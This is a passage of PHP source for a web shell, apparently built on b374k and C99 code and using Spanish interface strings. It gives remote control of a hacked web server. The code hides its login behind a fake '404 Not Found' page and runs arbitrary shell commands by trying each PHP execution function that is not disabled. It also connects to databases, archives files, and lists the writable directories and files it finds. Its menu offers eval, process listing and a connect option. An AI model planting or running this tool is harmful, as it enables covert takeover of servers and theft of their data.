            break;
        }
    }

    if (empty($img[$image])) $image = 'unk';
    return $img[$image];
}

# Validate now
if ($config['zPass']) {
	if ($config['zName']) {
		if (! isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== $config['zName'] || md5($_SERVER['PHP_AUTH_PW']) !== $config['zPass']) {
			header('WWW-Authenticate: Basic realm="Credentials request"');
			header('HTTP/1.0 401 Unauthorized');
			exit('<b>Access Denied</b>');
		}	
	} else {
		@session_start();
		if (!isset($_SESSION[ md5($_SERVER['HTTP_HOST']) ])) { 
			if (isset($_POST['p']) && (md5($_POST['p']) === $config['zPass'])) { 
				$_SESSION[ md5($_SERVER['HTTP_HOST']) ] = true; 
			} else {
				echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' .
					 '<html><head>' .
					 '<title>404 Not Found</title>' .
					 '</head><body>' .
					 '<h1>Not Found</h1>' .
					 '<p>The requested URL ' . $_SERVER['HTTP_HOST'] . ' was not found on this server.</p>' .
					 '</body>' .
					 '<style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>' .
					 '<center><form method=post><input type="password" name="p"></form></center>' .
					 '</html>';
				exit;
			}
		}
	}
}


# General functions
function execute($command, $info = false) {
    $via = '';
    $res = '';
    $dis_func = explode(',', get_cfg_var('disable_functions'));
    //$dis_func + explode(',', ini_get('disable_functions'));
    if ($command) {
        if (function_exists('exec') and !in_array('exec', $dis_func)) {
            exec($command, $res);
            $res = implode("\n", $res);
			$via = 'exec';
        } elseif (function_exists('shell_exec') and !in_array('shell_exec', $dis_func)) {
            $res = @shell_exec($command);
			$via = 'shell_exec';
        } elseif (function_exists('system') and !in_array('system', $dis_func)) {
            @ob_start();
            @system($command);
            $res = @ob_get_contents();
            @ob_end_clean();
			$via = 'system';
        } elseif (function_exists('passthru') and !in_array('passthru', $dis_func)) {
            @ob_start();
            @passthru($command);
            $res = @ob_get_contents();
            @ob_end_clean();
			$via = 'passthru';
        } elseif (function_exists('popen') and !in_array('popen', $dis_func)) {
            $handle = popen($command, 'r'); // Open the command pipe for reading
            if (is_resource($handle)) {	
                if (function_exists('fread') && function_exists('feof')) {
                    while (! feof($handle)) {
                        $res = fread($handle, 512);
                    }
                } elseif (function_exists('fgets') && function_exists('feof')) {
                    while (! feof($handle)) {
                        $res = fgets($handle, 512);
                    }
                }
            }
            pclose($handle);
			$via = 'popen';
        } elseif (function_exists('proc_open') and !in_array('proc_open', $dis_func)) {
			// stdout is a pipe that the child will write to
            $descriptorspec = array(1 => array("pipe", "w"));
            $handle = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($handle)) {
                if (function_exists('fread') && function_exists('feof')) {
                    while (! feof($pipes[1])) {
                        $res = fread($pipes[1], 512);
                    }
                } elseif (function_exists('fgets') && function_exists('feof')) {
                    while (! feof($pipes[1])) {
                        $res = fgets($pipes[1], 512);
                    }
                }
            }
            pclose($handle);
			$via = 'proc_open';
        }
    }

	$res = $res;
	if ($info) $res = array(0 => $res, 1 => $via);
    return($res);
}

function safeStatus() {
    $safe_mode = @ini_get('safe_mode');
    if (!$safe_mode && strpos(execute('echo abcdef'), 'def') != 3) $safe_mode = true;
    return $safe_mode;
}

function getfun($funName) {
    global $lang;
    return (false !== function_exists($funName)) ? $lang['yes'] : $lang['no'];
}

function getcfg($varname) {
    global $lang;
    $result = get_cfg_var($varname);
    if ($result == 0) return $lang['no'];
    elseif ($result == 1) return $lang['yes'];
    else return $result;
}

function sizecount($size) {
	if($size == 0) return '0 B';
	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
}

function getPath($scriptpath, $nowpath) {
    if ($nowpath === '.') $nowpath = $scriptpath;
    $nowpath = str_replace(array('\\', '//'), '/', $nowpath);
    if (substr($nowpath, -1) !== '/') $nowpath = $nowpath . '/';
    return $nowpath;
}

function getUpPath($nowpath) {
    $pathdb = explode('/', $nowpath);
    $num = count($pathdb);
    if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
    $uppath = implode('/', $pathdb) . '/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}

function simpleDialog($info) {
    return '<br><div style="border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">' . $info . '</div>';
}

function simpleValidate($variable) {
    if ((isset($variable)) and ($variable !== '')) return true;
    else return false;
}

# SQL
//based on b374k by DSR!
function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
	if ($sqltype === 'mysql') {
		$hosts = explode(':', $sqlhost);
		if(count($hosts)==2) $host_str = $hosts[0].':'.$hosts[1];
		else $host_str = $sqlhost;
		if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $sqluser, $sqlpass);
		elseif(function_exists('mysql_connect')) return @mysql_connect($host_str, $sqluser, $sqlpass);
	} elseif($sqltype === 'mssql') {
		if(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);
		elseif(function_exists('sqlsrv_connect')){
			$coninfo = array('UID'=>$sqluser, 'PWD'=>$sqlpass);
			return @sqlsrv_connect($sqlhost,$coninfo);
		}
	} elseif($sqltype === 'pgsql') {
		$hosts = explode(':', $sqlhost);
		if(count($hosts)==2) $host_str = 'host='.$hosts[0].' port='.$hosts[1];
		else $host_str = 'host='.$sqlhost;
		if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$sqluser.' password='.$sqlpass);
	} elseif($sqltype === 'oracle') { 
		if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); 
	} elseif($sqltype === 'sqlite3') {
		if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
	} elseif($sqltype === 'sqlite') { 
		if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); 
	} elseif($sqltype === 'odbc') { 
		if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass);
	} elseif($sqltype === 'pdo') {
		if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);
	}
	return false;
}

function sql_query($sqltype, $query, $con){
	if ($sqltype === 'mysql') {
		if(function_exists('mysqli_query')) return mysqli_query($con,$query);
		elseif(function_exists('mysql_query')) return mysql_query($query);
	} elseif($sqltype === 'mssql') {
		if(function_exists('mssql_query')) return mssql_query($query);
		elseif(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
	} elseif($sqltype === 'pgsql') return pg_query($query);
	elseif($sqltype === 'oracle') return oci_execute(oci_parse($con, $query));
	elseif($sqltype === 'sqlite3') return $con->query($query);
	elseif($sqltype === 'sqlite') return sqlite_query($con, $query);
	elseif($sqltype === 'odbc') return odbc_exec($con, $query);
	elseif($sqltype === 'pdo') return $con->query($query);
}

function sql_num_fields($sqltype, $result, $con){
	if ($sqltype === 'mysql') {
		if(function_exists('mysqli_field_count')) return mysqli_field_count($con);
		elseif (function_exists('mysql_num_fields')) return mysql_num_fields($result);
	} elseif($sqltype === 'mssql') {
		if(function_exists('mssql_num_fields')) return mssql_num_fields($result);
		elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
	} elseif($sqltype === 'pgsql') return pg_num_fields($result);
	elseif($sqltype === 'oracle') return oci_num_fields($result);
	elseif($sqltype === 'sqlite3') return $result->numColumns();
	elseif($sqltype === 'sqlite') return sqlite_num_fields($result);
	elseif($sqltype === 'odbc') return odbc_num_fields($result);
	elseif($sqltype === 'pdo') return $result->columnCount();
}

function sql_field_name($sqltype,$result,$i){
	if ($sqltype === 'mysql') {
		if(function_exists('mysqli_fetch_fields')) {
			$metadata = mysqli_fetch_fields($result);
			if(is_array($metadata)) return $metadata[$i]->name;
		} elseif (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
	} elseif($sqltype === 'mssql') {
		if(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
		elseif(function_exists('sqlsrv_field_metadata')){
			$metadata = sqlsrv_field_metadata($result);
			if(is_array($metadata)) return $metadata[$i]['Name'];
		}
	} elseif($sqltype === 'pgsql') return pg_field_name($result,$i);
	elseif($sqltype === 'oracle') return oci_field_name($result,$i+1);
	elseif($sqltype === 'sqlite3') return $result->columnName($i);
	elseif($sqltype === 'sqlite') return sqlite_field_name($result,$i);
	elseif($sqltype === 'odbc') return odbc_field_name($result,$i+1);
	elseif($sqltype === 'pdo'){
		$res = $result->getColumnMeta($i);
		return $res['name'];
	}
}

function sql_fetch_data($sqltype,$result){
	if ($sqltype === 'mysql') {
		if(function_exists('mysqli_fetch_row')) return mysqli_fetch_row($result);
		elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
	} elseif($sqltype === 'mssql') {
		if(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
		elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
	} elseif($sqltype === 'pgsql') return pg_fetch_row($result);
	elseif($sqltype === 'oracle') return oci_fetch_row($result);
	elseif($sqltype === 'sqlite3') return $result->fetchArray(1);
	elseif($sqltype === 'sqlite') return sqlite_fetch_array($result,1);
	elseif($sqltype === 'odbc') return odbc_fetch_array($result);
	elseif($sqltype === 'pdo') return $result->fetch(2);
}

function sql_num_rows($sqltype,$result){
	if ($sqltype === 'mysql') {
		if(function_exists('mysqli_num_rows')) return mysqli_num_rows($result);
		elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
	} elseif($sqltype === 'mssql') {
		if(function_exists('mssql_num_rows')) return mssql_num_rows($result);
		elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
	} elseif($sqltype === 'pgsql') return pg_num_rows($result);
	elseif($sqltype === 'oracle') return oci_num_rows($result);
	elseif($sqltype === 'sqlite3'){
		$metadata = $result->fetchArray();
		if(is_array($metadata)) return $metadata['count'];
	} elseif($sqltype === 'sqlite') return sqlite_num_rows($result);
	elseif($sqltype === 'odbc') return odbc_num_rows($result);
	elseif($sqltype === 'pdo') return $result->rowCount();
}

function sql_close($sqltype,$con){
	if ($sqltype === 'mysql') {
		if(function_exists('mysqli_close')) return mysqli_close($con);
		elseif(function_exists('mysql_close')) return mysql_close($con);
	} elseif($sqltype === 'mssql'){
		if(function_exists('mssql_close')) return mssql_close($con);
		elseif(function_exists('sqlsrv_close')) return sqlsrv_close($con);
	} elseif($sqltype === 'pgsql') return pg_close($con);
	elseif($sqltype === 'oracle') return oci_close($con);
	elseif($sqltype === 'sqlite3') return $con->close();
	elseif($sqltype === 'sqlite') return sqlite_close($con);
	elseif($sqltype === 'odbc') return odbc_close($con);
	elseif($sqltype === 'pdo') return $con = null;
}
 
/*
    function dump($table) {
        if (empty($table)) return 0;
        $this->dump = array();
        $this->dump[0] = '';
        $this->dump[1] = '-- --------------------------------------- ';
        $this->dump[2] = '--  Created: ' . date("d/m/Y H:i:s");
        $this->dump[3] = '--  Database: ' . $this->base;
        $this->dump[4] = '--  Table: ' . $table;
        $this->dump[5] = '-- --------------------------------------- ';

        switch ($this->db) {
            case 'MySQL':
                $this->dump[0] = '-- MySQL dump';
                if ($this->query('SHOW CREATE TABLE `' . $table . '`') != 1) return 0;
                if (! $this->get_result()) return 0;
                $this->dump[] = $this->rows[0]['Create Table'];
                $this->dump[] = '-- ------------------------------------- ';
                if ($this->query('SELECT * FROM `' . $table . '`') != 1) return 0;
                if (! $this->get_result()) return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @mysql_real_escape_string($v);
                    }
                    $this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'MSSQL':
                $this->dump[0] = '## MSSQL dump';
                if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
                if (! $this->get_result()) return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @addslashes($v);
                    }
                    $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'PostgreSQL':
                $this->dump[0] = '## PostgreSQL dump';
                if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
                if (! $this->get_result()) return 0;
                for ($i = 0; $i < $this->num_rows; $i++) {
                    foreach ($this->rows[$i] as $k => $v) {
                        $this->rows[$i][$k] = @addslashes($v);
                    }
                    $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
                }
                break;
            case 'Oracle':
                $this->dump[0] = '## ORACLE dump';
                $this->dump[] = '## under construction';
                break;
            default:
                return 0;
                break;
        }

        return 1;
    }
*/


//TODO agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
//para poder usarlo con archivos enormes/poca memoria
# Based on PHPZip v1.2 by DSR!
class PHPZip {
    var $datasec = array();
    var $ctrl_dir = array();
    var $old_offset = 0;

    function Zipper($filelist) {
		$curdir = dirname($filelist[0]);
		foreach ($filelist as $filename) {	
			if (file_exists($filename)) {
				if (is_dir($filename)) $content = $this->GetFileList($filename, $curdir);
				if (is_file($filename)) {
					$fd = fopen($filename, 'r');
					$content = fread($fd, filesize($filename));
					fclose($fd);
					$this->addFile($content, str_replace($curdir . '/', '', $filename));
				}
			}
        }
        $out = $this->file();
		
        return 1;
    }

    function GetFileList($dir, $curdir) {
        if (file_exists($dir)) {			
			$dirPrefix = basename($dir) . '/';
            $dh = opendir($dir);
            while ($files = readdir($dh)) {
                if (($files !== '.') && ($files !== '..')) {
                    if (is_dir($dir . $files)) $this->GetFileList($dir . $files . '/', $curdir);
                    else {
						$fd = fopen($dir . $files, 'r');
						$content = fread($fd, filesize($dir . $files));
						fclose($fd);
						$this->addFile($content, str_replace($curdir . '/', '', $dir . $files));
                    }
                }
            }
            closedir($dh);
        }
        return 1;
    }

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) $timearray = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
	
	function hex2bin($str) {
		$bin = '';
		$i = 0;
		do {
			$bin .= chr(hexdec($str{$i}.$str{($i + 1)}));
			$i += 2;
		} while ($i < strlen($str));
		return $bin;
	}

    function addFile($data, $name, $time = 0) {
        //$name = str_replace('\\', '/', $name);
		$packv0 = pack('v', 0);
        $dtime = dechex($this->unix2DosTime($time));
		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;

        // "local file header" segment
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len = strlen($zdata);
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len);

        // add this entry to array
        $this->datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
        $cdrec .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset += strlen($fr);
        $cdrec .= $name;

        // save to central directory
        $this->ctrl_dir[] = $cdrec;
    }

    function file() {
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
    }

    function output($file) {
        $fp = fopen($file, 'w');
        fwrite($fp, $this->file());
        fclose($fp);
    }
}

# Menu
$sysMenu = '<a href="#" onclick="go(\'' . $config['Menu'] . '=file\');"><b>' . $lang['fm'] . '</b></a> | ' .    
    '<a href="#" onclick="go(\'' . $config['Menu'] . '=procs\');"><b>' . $lang['procs'] . '</b></a> | ' .        
    '<a href="#" onclick="go(\'' . $config['Menu'] . '=phpenv\');"><b>' . $lang['info'] . '</b></a> | ' .    
    '<a href="#" onclick="go(\'' . $config['Menu'] . '=connect\');"><b>' . $lang['ec'] . '</b></a> | ' .    
    '<a href="#" onclick="go(\'' . $config['Menu'] . '=sql\');"><b>' . $lang['sql'] . '</b></a> | ' .    
    '<a href="#" onclick="go(\'' . $config['Menu'] . '=eval\');"><b>' . $lang['exe'] . '</b></a> | ' .    
    //'<a href="#" onclick="go(\'' . $config['Menu'] . '=update\');"><b>' . $lang['update'] . '</b></a> | ' .    
    '<a href="#" onclick="go(\'' . $config['Menu'] . '=srm\');"><b>' . $lang['sr'] . '</b></a> ' .
	(($config['zPass']) ? ' | <a href="#" onclick="if (confirm(\'' . $lang['merror'] . '\')) window.close();return false;"><b>' . $lang['out'] . '</b></a>' : '');

# Sections
if ($_POST[$config['Menu']] === 'file') {
	$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
	//provisorio
	define('SA_ROOT', str_replace('\\', '/', dirname(__file__)) . '/');
	$nowpath = getPath(SA_ROOT, '.');
    
	function dirsize($dir) {
        $f = $s = 0;
        $dh = @opendir($dir);
        while ($file = @readdir($dh)) {
			if ($file !== '.' && $file !== '..') {
				$path = $dir . '/' . $file;
				if (@is_dir($path)) {
					$tmp = dirsize($path); 
					$f = $f + $tmp['files'];  
					$s = $s + $tmp['size'];  
				} else {
					$f++;
					$s += @filesize($path);
				}
			}
        }
        @closedir($dh);
        return array ('files' => $f, 'size' => $s);
    }

    function getChmod($filepath) {
        return substr(base_convert(@fileperms($filepath), 10, 8), -4);
    }

    function getPerms($filepath){ # C99r16
		$mode = @fileperms($filepath);
        if (($mode & 0xC000) === 0xC000) {$type = 's';}    // Socket
        elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}// Directory
        elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}// Symbolic Link
        elseif (($mode & 0x8000) === 0x8000) {$type = '-';}// Regular 
        elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}// Block special
		elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}// Character special
		elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}// FIFO pipe
		else {$type = '?';}                                // Unknown

		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
		$owner['write'] = ($mode & 00200) ?   'w' : '-'; 
		$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
		$group['read'] = ($mode & 00040) ?    'r' : '-'; 
		$group['write'] = ($mode & 00020) ?   'w' : '-'; 
		$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
		$world['read'] = ($mode & 00004) ?    'r' : '-'; 
		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

		if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
		if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
		if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
		
		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
    }
		
    function getext($file) {
		$info = pathinfo($file);
		return $info['extension'];
    }

    function getUser($filepath) {
		if (function_exists('posix_getpwuid')) {
			$array = @posix_getpwuid(@fileowner($filepath));
			if ($array && is_array($array)) {
				return ' / <a href="#" title="User: ' . $array['name'] . '
					Passwd: ' . $array['passwd'] . '
					Uid: ' . $array['uid'] . '
					gid: ' . $array['gid'] . '
					Gecos: ' . $array['gecos'] . '
					Dir: ' . $array['dir'] . '
					Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
			}
		}
		return '';
    }

    function GetWDirList($dir) {
            global $dirdata, $j, $nowpath;
            ! $j && $j = 1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
                        if (is_writable($f)) {
                            $dirdata[$j]['filename'] = str_replace($nowpath, '', $f);
                            $dirdata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                            $dirdata[$j]['dirchmod'] = getChmod($f);
                            $dirdata[$j]['dirperm'] = getPerms($f);
                            $dirdata[$j]['dirlink'] = $dir;
                            $dirdata[$j]['server_link'] = $f;
                            $j++;
                        }
                        GetWDirList($f);
                    }
                }
                closedir($dh);
                clearstatcache();
                return $dirdata;
            } else {
                return array();
            }
    }

    function GetWFileList($dir) {
            global $filedata, $j, $nowpath, $writabledb;
            ! $j && $j = 1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $ext = getext($file);
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
                        GetWFileList($f);
                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                        if (is_writable($f)) {
                            $filedata[$j]['filename'] = str_replace($nowpath, '', $f);
                            $filedata[$j]['size'] = sizecount(@filesize($f));
                            $filedata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                            $filedata[$j]['filechmod'] = getChmod($f);
                            $filedata[$j]['fileperm'] = getPerms($f);
                            $filedata[$j]['fileowner'] = getUser($f);
                            $filedata[$j]['dirlink'] = $dir;
                            $filedata[$j]['server_link'] = $f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
    }

    function GetSFileList($dir, $content, $re = 0) {
            global $filedata, $j, $nowpath, $writabledb;
            ! $j && $j = 1;
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    $ext = getext($file);
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
                        GetSFileList($f, $content, $re = 0);
                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                        $find = 0;
                        if ($re) {
                            if (preg_match('@' . $content . '@', $file) || preg_match('@' . $content . '@', @file_get_contents($f))) {
                                $find = 1;
                            }
                        } else {
                            if (strstr($file, $content) || strstr(@file_get_contents($f), $content)) {
                                $find = 1;
                            }
                        }
                        if ($find) {
                            $filedata[$j]['filename'] = str_replace($nowpath, '', $f);
                            $filedata[$j]['size'] = sizecount(@filesize($f));
                            $filedata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                            $filedata[$j]['filechmod'] = getChmod($f);
                            $filedata[$j]['fileperm'] = getPerms($f);
                            $filedata[$j]['fileowner'] = getUser($f);
                            $filedata[$j]['dirlink'] = $dir;
                            $filedata[$j]['server_link'] = $f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
    }

    function delTree($path) {
            $origipath = $path;
            $handler = opendir($path);
            while (true) {
                $item = readdir($handler);
                if ($item === '.' or $item === '..') {
                    continue;
                } elseif (gettype($item) === 'boolean') {
                    closedir($handler);
                    if (! @rmdir($path)) {
                        return false;
                    }
                    if ($path == $origipath) {
                        break;
                    }
                    $path = substr($path, 0, strrpos($path, '/'));
                    $handler = opendir($path);
                } elseif (is_dir($path . '/' . $item)) {
                    closedir($handler);
                    $path = $path . '/' . $item;
                    $handler = opendir($path);
                } else {
                    unlink($path . '/' . $item);
                }
            }
            return true;
    }
		
    function recursiveCopy($path, $dest){ 
		if (is_dir($path)) {
			@mkdir($dest);
			$objects = scandir($path);
			if (sizeof($objects) > 0) {
				foreach($objects as $file) {
					if ($file !== '.' && $file !== '..') {
						if (is_dir($path.$file)) {
							recursiveCopy($path . $file . '/', $dest . '/' . $file . '/');
						} else {
							copy($path . $file, $dest . $file);
						}
					}
				}
			}
			return true;
		} elseif(is_file($path)) {
			return copy($path, $dest);
		} else {
			return false;
		} 
    }

	function view_perms_color($target) { 
		if (! is_readable($target)) {
			return '<font color=red>' . getPerms(fileperms($target)) . '</font>';
		} elseif (! is_writable($target)) {
			return '<font color=white>' . getPerms(fileperms($target)) . '</font>';
		} else {
			return '<font color=green>' . getPerms(fileperms($target)) . '</font>';
		} 
	}	



	$js = "
			function createfile(nowpath){
				mkfile = prompt('Ingrese nombre del archivo:', '');
				if (!mkfile) return;
				go('" . $config['Action'] . "=createfile&mkfile=' + mkfile + '&dir=' + nowpath);
			}
			
			function createdir(nowpath){
				newdirname = prompt('Ingresa el nombre del directorio:', '');
				if (!newdirname) return;
				go('" . $config['Action'] . "=createdir&newdirname=' + newdirname + '&dir=' + nowpath);
			}
			
			function deldir(deldir){
				action = confirm('Esta seguro que desea eliminar: \\n' + deldir);
				if (action == true) go('" . $config['Action'] . "=deldir&deldir=' + deldir);
			}
			
			function fileperm(pfile){
				var newperm;
				newperm = prompt('Archivo actual:\\n' + pfile + '\\nIngresa un nuevo atributo:', '');
				if (!newperm) return;
				go('" . $config['Action'] . "=modpers&newperm=' + newperm + '&pfile=' + pfile);
			}
			
			function rename(oldname){
				newname = prompt('Former file name:\\n' + oldname + '\\nNew name:', '');
				if (!newname) return;
				go('" . $config['Action'] . "=rename&newfilename=' + newname + '&oldfilename=' + oldname);
			}
			
			function copyfile(){
				tofile = prompt('Archivo(s) a la siguiente ruta:\\n', '');
				if (!tofile) return;
				go('" . $config['Action'] . "=copy&copy=' + tofile);
			}

			function process(action){
				document.getElementById('info').innerHTML = '<input type=\"hidden\" name=\"" . $config['Action'] . "\" value=\"' + action + '\"/>';
				document.filelist.submit();
				return false;
			}

			function viewSize(folder, target){
				document.getElementById(target).innerHTML = '[...]';
				var xmlhttp;
				if (window.XMLHttpRequest) {
					xmlhttp=new XMLHttpRequest();
				} else {
					xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');
				}
				xmlhttp.onreadystatechange = function() {
					if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
						document.getElementById(target).innerHTML = xmlhttp.responseText;
					}
				}
				var params = '" . $config['Menu'] . "=file&" . $config['Mode'] . "=viewSize&folder=' + folder;
				xmlhttp.open('POST', '" . $self . "', true);
				xmlhttp.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
				xmlhttp.setRequestHeader('content-length', params.length);
				xmlhttp.setRequestHeader('Connection', 'close');
				xmlhttp.send(params);
			}
			";	
			

    if (@$_POST[$config['Mode']] === 'viewSize') {
		$s = dirsize($_POST['folder']);
		echo is_numeric($s['size']) ? sizecount($s['size']) . ' (' . $s['files'] . ')' : 'Unknown';
		exit;
    } elseif (@$_POST[$config['Mode']] === 'info') {
		$content .= '<b>Information:</b>
					 <table border=0 cellspacing=1 cellpadding=2>
					 <tr><td><b>Path</b></td><td> ' . $_POST['target'] . '</td></tr>
					 <tr><td><b>Size</b></td><td> ' . sizecount(filesize($_POST['target'])) . '</td></tr>
					 <tr><td><b>MD5</b></td><td> ' . strtoupper( @md5_file($_POST['target']) ) . '</td></tr>
					 <tr><td><b>SHA1</b></td><td> ' . strtoupper( @sha1_file($_POST['target']) ) . '</td></tr>';
		if (!$isWIN) {
			$content .= '<tr><td><b>Owner/Group</b></td><td> ';
			$ow = posix_getpwuid(fileowner($_POST['target']));
			$gr = posix_getgrgid(filegroup($_POST['target']));
			$content .= ($ow['name'] ? $ow['name'] : fileowner($_POST['target'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($_POST['target']));
			$content .= '<tr><td><b>Perms</b></td><td>' . view_perms_color($_POST['target']) . '</td></tr>';
		}
		$content .= '<tr><td><b>Create time</b></td>
					 <td>' . date('d/m/Y H:i:s', filectime($_POST['target'])) . '</td></tr>
					 <tr><td><b>Access time</b></td><td> ' . date('d/m/Y H:i:s', fileatime($_POST['target'])) . '</td></tr>
					 <tr><td><b>Modify time</b></td><td> ' . date('d/m/Y H:i:s', filemtime($_POST['target'])) . '</td></tr>
					 </table><br><p>
					 [<a href="#" onclick="go(\'' . $config['Mode'] . '\=info&target=' . $_POST['target'] . '&hexdump=full\');">Hexdump full</a>] 
					 [<a href="#" onclick="go(\'' . $config['Mode'] . '\=info&target=' . $_POST['target'] . '&hexdump=preview\');">Hexdump preview</a>]
					 [<a href="#" onclick="go(\'' . $config['Mode'] . '\=info&target=' . $_POST['target'] . '&view=normal\');">View</a>]
					 [<a href="#" onclick="go(\'' . $config['Mode'] . '\=info&target=' . $_POST['target'] . '&highlight=full\');">Highlight</a>]</p><br>';
		
		$fp  = @fopen($_POST['target'], 'rb');
		if ($fp) {
			if (@simpleValidate($_POST['hexdump'])) {
				if ($_POST['hexdump'] === 'full') {
					$content .= '<b>Hex Dump</b><br><br>';
					$str = fread($fp, filesize($_POST['target']));
				} else {
					$content .= '<b>Hex Dump Preview</b><br><br>';
					$str = fread($fp, $config['hexdump_lines'] * $config['hexdump_rows']);
				}
